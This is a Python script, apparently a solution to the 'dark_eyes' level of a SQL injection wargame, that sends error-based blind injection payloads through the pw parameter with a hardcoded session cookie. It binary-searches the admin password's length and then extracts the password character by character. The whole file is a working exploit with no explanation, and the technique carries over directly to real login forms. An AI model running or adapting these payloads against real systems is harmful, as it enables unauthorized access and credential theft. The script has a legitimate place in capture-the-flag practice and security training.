
import requests
url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
cookie = {'PHPSESSID': 'o390n0a72vrspg30ujnemh0bnf'}


def check(data):
    return "prob" not in data


ok = 0
ng = 60

while ok + 1 != ng:
    md = (ok + ng) // 2
    q = f"'or id='admin' and (select exp(1000) where length(pw) >= {md}) #"
    res = requests.get(url, params={'pw': q}, cookies=cookie)
    print(f"[+] try {md}")
    if check(res.text):
        ok = md
    else:
        ng = md

length = ok
print(f"[*] length = {length}")

ans = ""
for i in range(0, length):
    ok = 0
    ng = 256

    while ok + 1 != ng:
        md = (ok + ng) // 2
        q = f"'or id='admin' and (select exp(1000) where {md} <= ascii(substr(pw,{i+1},1))) #"
        res = requests.get(url, params={'pw': q}, cookies=cookie)
        print(f"[+] try {md}")
        if check(res.text):
            ok = md
        else:
            ng = md

    ans += str(chr(ok))
    print(f"[*] {ans}")

print(f"[*] find! {ans}")
